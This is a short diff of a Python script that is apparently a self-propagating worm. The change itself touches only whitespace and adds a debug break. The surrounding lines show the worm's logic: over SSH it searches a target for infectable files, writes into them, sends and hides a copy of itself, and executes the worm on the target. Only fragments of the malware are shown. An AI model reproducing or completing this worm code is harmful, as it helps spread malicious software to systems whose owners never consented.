@@ -238,7 +238,7 @@ while True:
                     print(received_list)
                     print("\nCalling search_signature")
                     infected_list = search_signature(received_list)
-                    print("\nafter call")	
+                    print("\nafter call")   
                     if not received_list:                         #if no infectable file is present then send a copy of virus, hide it, then execute
                         print("\nNo infectable targets on this system")
                         send_worm_totarget(ssh)
@@ -260,3 +260,4 @@ while True:
                         OUT.close()
                         newly_infected.append(item)
                     execute_worm_ontarget(ssh,newly_infected)
+    if debug: break
